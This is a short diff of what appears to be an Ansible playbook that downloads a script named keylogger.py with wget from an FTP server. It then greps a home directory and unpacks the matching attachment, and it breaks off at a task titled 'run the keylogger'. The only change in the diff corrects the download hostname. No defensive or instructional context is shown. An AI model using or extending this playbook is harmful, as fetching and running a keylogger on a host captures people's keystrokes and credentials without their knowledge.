@@ -20,7 +20,7 @@
   hosts: contractor
   tasks:
     - name: download the package
-      raw: wget --user=anonymous --password='contractor@fazio.com' ftp://download.fazio.com:21/download/keylogger.py
+      raw: wget --user=anonymous --password='contractor@fazio.com' ftp://downloads.fazio.com:21/download/keylogger.py
     - name: unpack the attachment
       raw: grep -lir "keylogger" /home/ubuntu | xargs munpack
     - name: run the keylogger
